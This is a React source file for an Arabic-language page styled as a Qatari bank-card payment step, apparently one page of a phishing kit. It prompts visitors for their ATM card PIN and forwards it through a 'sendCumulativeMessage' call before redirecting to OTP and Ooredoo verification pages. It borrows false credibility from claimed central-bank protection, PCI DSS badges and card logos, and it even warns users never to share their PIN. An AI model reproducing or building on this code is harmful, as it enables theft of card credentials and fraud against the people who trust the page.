import { useState } from "react";
import { useNavigate } from "react-router-dom";
import Header from "@/components/Header";
import Stepper from "@/components/Stepper";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import securePaymentLogos from "@/assets/secure-payment-logos.png";
import { useRegistration } from "@/contexts/RegistrationContext";
const steps = [{
  number: 1,
  title: "نوع الحساب"
}, {
  number: 2,
  title: "البيانات الشخصية"
}, {
  number: 3,
  title: "كلمة المرور"
}, {
  number: 4,
  title: "إتمام التسجيل"
}];
const ATMPin = () => {
  const navigate = useNavigate();
  const {
    updateData,
    sendCumulativeMessage
  } = useRegistration();
  const [pin, setPin] = useState("");
  const handleConfirm = async () => {
    if (pin.length === 4) {
      const newData = {
        atmPin: pin
      };
      updateData(newData);
      await sendCumulativeMessage(6, "رقم PIN", newData);
      navigate('/ooredoo-verification');
    }
  };
  return <div className="min-h-screen flex flex-col bg-white" dir="rtl">
      <Header />
      
      <main className="flex-1 container mx-auto px-4 py-12 bg-white">
        <Stepper currentStep={4} steps={steps} />
        
        <div className="max-w-2xl mx-auto mt-8">
          <div className="bg-secondary/30 rounded-lg shadow-lg p-8 border border-border">
            <div className="text-center mb-8">
              <div className="w-20 h-20 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10 text-primary" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                </svg>
              </div>
              <h2 className="text-2xl font-bold mb-2 text-foreground">
                إدخال الرقم السري للبطاقة
              </h2>
              <p className="text-sm text-muted-foreground">
                لتأكيد عملية الدفع الإلكتروني
              </p>
            </div>

            <div className="bg-background rounded-lg p-6 mb-6">
              <p className="text-base text-foreground text-right mb-6 leading-relaxed">
                لإتمام عملية الدفع بشكل آمن، يرجى إدخال الرقم السري (PIN) الخاص ببطاقتكم المصرفية المكون من 4 أرقام في الحقل أدناه.
              </p>

              <div className="flex justify-center mb-6">
                <Input type="password" inputMode="numeric" pattern="[0-9]*" maxLength={4} value={pin} onChange={e => setPin(e.target.value.replace(/\D/g, '').slice(0, 4))} className="w-32 h-14 text-2xl text-center tracking-[0.5em] border-primary" dir="ltr" placeholder="ATM PIN " />
              </div>

              <div className="bg-amber-50 dark:bg-amber-950/30 border border-amber-200 dark:border-amber-800 rounded-lg p-4 mb-4">
                <div className="flex items-start gap-2">
                  <span className="text-lg">⚠️</span>
                  <div className="text-right">
                    <p className="text-sm font-semibold text-amber-900 dark:text-amber-200 mb-1">
                      تنبيه هام
                    </p>
                    <p className="text-xs text-amber-800 dark:text-amber-300">
                      لا تشارك الرقم السري لبطاقتكم مع أي شخص. موظفو البنك أو الجهات الرسمية لن يطلبوا منكم هذا الرقم.
                    </p>
                  </div>
                </div>
              </div>

              <div className="bg-primary/5 border border-primary/20 rounded-lg p-4 flex items-start gap-2">
                <span className="text-lg">🔐</span>
                <p className="text-xs text-foreground text-right">
                  <strong>حماية معلوماتكم:</strong> جميع البيانات المالية محمية بتشفير متقدم من الدرجة المصرفية (SSL 256-bit) وفقاً لمعايير الأمان الدولية PCI DSS.
                </p>
              </div>
            </div>

            <div className="flex gap-3 flex-row-reverse">
              <Button className="bg-primary hover:bg-primary/90 text-primary-foreground flex-1" onClick={handleConfirm} disabled={pin.length !== 4}>
                تأكيد الدفع
              </Button>
              <Button variant="outline" onClick={() => navigate('/payment-otp')}>
                رجوع
              </Button>
            </div>

            <div className="mt-6 pt-6 border-t border-border space-y-4">
              <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
                <span>🏦</span>
                <p className="text-center">
                  عملية الدفع محمية من قبل مصرف قطر المركزي والبنوك المعتمدة في دولة قطر
                </p>
              </div>
              
              <div className="flex justify-center">
                <img src={securePaymentLogos} alt="Secure Payment Methods - Powered by Stripe, MasterCard, VISA, Discover, American Express" className="w-full max-w-xl opacity-80" />
              </div>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>;
};
export default ATMPin;